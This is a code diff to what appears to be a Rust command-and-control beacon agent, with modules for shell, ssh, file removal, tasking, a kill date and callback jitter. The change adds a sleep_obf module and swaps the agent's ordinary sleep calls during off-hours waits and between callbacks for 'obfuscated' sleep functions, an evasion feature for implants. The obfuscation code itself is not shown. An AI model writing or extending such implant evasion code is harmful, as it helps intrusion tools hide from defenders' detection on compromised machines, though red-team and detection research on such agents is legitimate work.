@@ -28,6 +28,7 @@ mod rm;
 mod setenv;
 mod shell;
 mod sleep;
+mod sleep_obf;
 mod ssh;
 mod tasking;
 mod unsetenv;
@@ -87,12 +88,12 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
         if now < working_start {
             let delta =
                 Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
-            std::thread::sleep(delta.to_std()?);
+            sleep_obf::obfuscated_sleep_duration(delta.to_std()?);
         } else if now > working_end {
             let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
             let delta =
                 Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
-            std::thread::sleep(delta.to_std()?);
+            sleep_obf::obfuscated_sleep_duration(delta.to_std()?);
         }
 
         // Check if the agent has passed the kill date
@@ -110,9 +111,9 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
             return Ok(());
         }
 
-        // Calculate the sleep time and sleep the agent
+        // Calculate the sleep time and sleep the agent with obfuscation
         let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
-        std::thread::sleep(std::time::Duration::from_secs(sleeptime));
+        sleep_obf::obfuscated_sleep(sleeptime);
 
         // Increment the current attempt
         tries += 1;
